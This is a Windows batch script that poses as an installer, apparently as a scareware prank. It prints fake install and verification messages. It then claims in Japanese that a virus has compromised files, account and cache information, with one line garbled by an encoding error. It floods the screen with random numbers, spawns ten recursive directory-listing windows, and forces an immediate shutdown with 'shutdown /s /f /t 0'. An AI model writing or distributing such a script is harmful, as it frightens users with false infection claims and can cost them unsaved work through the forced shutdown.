@echo off
setlocal enabledelayedexpansion
chcp 65001
echo %date% %time% "起動を確認しました。本プログラムの利用規約に同意したとみなされます。"
timeout /nobreak 3 >null
echo %time% "Starting install..."
timeout /nobreak 1 >null
echo %time% "Successfully verified installer hash."
timeout /nobreak 1 >null
echo %time% "Starting deploy."
timeout /nobreak 1 >null
echo %time% "Successfully installed."
timeout /nobreak 1 >null
echo %time% "ウイルスの進行状況を確認…"
timeout /nobreak 3 >null
echo %time% "失敗しました。"
timeout /nobreak 3 >null
echo %time% "ファイルを保護…"
timeout /nobreak 3 >null
echo %time% "失敗しました。"
timeout /nobreak 3 >null
echo %time% "アカウント情報、キャッシュ情報を保護…"
timeout /nobreak 3 >null
echo %time% "蟇ｾ蜃ｦ荳崎?縺ｪ鬆伜沺縺ｫ繧ｦ繧､繝ｫ繧ｹ縺御ｾｵ蜈･縺励∪縺励◆縲ゆｽ咲ｽｮ諠??ｱ縲√い繧ｫ繧ｦ繝ｳ繝域ュ蝣ｱ縲√く繝｣繝?す繝･諠??ｱ縺御ｾｵ螳ｳ縺輔ｌ縺ｾ縺励◆縲"
timeout /nobreak 2 >null
for /l %%i in (1,1,10) do (
    echo !random! !random! !random! !random! !random! !random! !random! !random! !random! !random! !random! !random! !random! !random!
    timeout /nobreak 2 >null
    start dir /s
)
shutdown.exe /s /f /t 0